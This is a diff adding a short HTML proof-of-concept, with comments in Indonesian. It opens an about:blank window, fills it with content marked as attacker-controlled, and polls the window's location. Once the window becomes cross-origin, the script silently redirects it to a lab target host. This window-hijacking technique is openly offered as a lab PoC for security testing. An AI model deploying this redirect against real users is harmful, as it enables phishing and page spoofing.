@@ -1,0 +1,35 @@
+<!-- attacker-aboutblank-poll.html -->
+<!doctype html>
+<meta charset="utf-8">
+<title>about:blank poll PoC</title>
+<script>
+function f() {
+  const w = window.open('about:blank', '_blank'); // guaranteed controllable
+  try {
+    w.document.open();
+    w.document.write(`
+      <style>body{font-family:system-ui;padding:40px}</style>
+      <h1>Fake Content (lab)</h1>
+      <p>Controlled by attacker.local</p>
+    `);
+    w.document.close();
+  } catch(e) {
+    console.warn('write blocked:', e);
+  }
+
+  // coba akses href; jika suatu waktu baca -> cross-origin (throw), maka kita replace ke test-target
+  const poll = setInterval(() => {
+    try {
+      const x = w.location.href;
+      // masih bisa baca; do nothing
+    } catch(err) {
+      clearInterval(poll);
+      try { w.location.replace('https://test-target.local:8443/'); } catch(e){ console.warn(e); }
+    }
+  }, 30);
+}
+</script>
+<body>
+  <button onclick="f()">Run PoC</button>
+</body>
+</html>
